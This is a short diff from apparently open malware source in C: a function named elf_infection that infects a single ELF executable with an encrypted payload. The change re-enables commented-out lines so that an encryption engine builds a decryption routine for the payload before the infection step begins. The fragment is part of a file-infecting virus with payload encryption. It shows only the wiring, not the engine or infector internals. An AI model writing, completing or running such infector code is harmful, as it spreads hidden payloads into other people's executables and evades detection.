@@ -28,18 +28,15 @@ int elf_infection(options_t *options){
   	if (VERBOSE) printf("%s: infecting single ELF file\n", INFO_BANNER );
 
 	// 1. Create payload encrypted by the engine
-	//char *engine_func = NULL;
-	//unsigned long engine_func_size = 0;
+	char *engine_func = NULL;
+	unsigned long engine_func_size = 0;
 
-	//if (VERBOSE) printf("%s: creating decryption function for the payload\n", INFO_BANNER );
+	if (VERBOSE) printf("%s: creating decryption function for the payload\n", INFO_BANNER );
 
-	//engine_creation(options, &engine_func, &engine_func_size);
-
-	//if (VERBOSE) printf("%s: engine_func = %s\n", INFO_BANNER, engine_func );
-	//if (VERBOSE) printf("%s: engine_func_size = %lu\n", INFO_BANNER, engine_func_size );
+	engine_creation(options, &engine_func, &engine_func_size);
 	
-	//options->input = engine_func;
-	//options->inputsz = engine_func_size;
+	options->input = engine_func;
+	options->inputsz = engine_func_size;
 
 	// 2. infect ELF file with encrypted payload
   	if (VERBOSE) printf("%s: infection process beginning\n", INFO_BANNER );
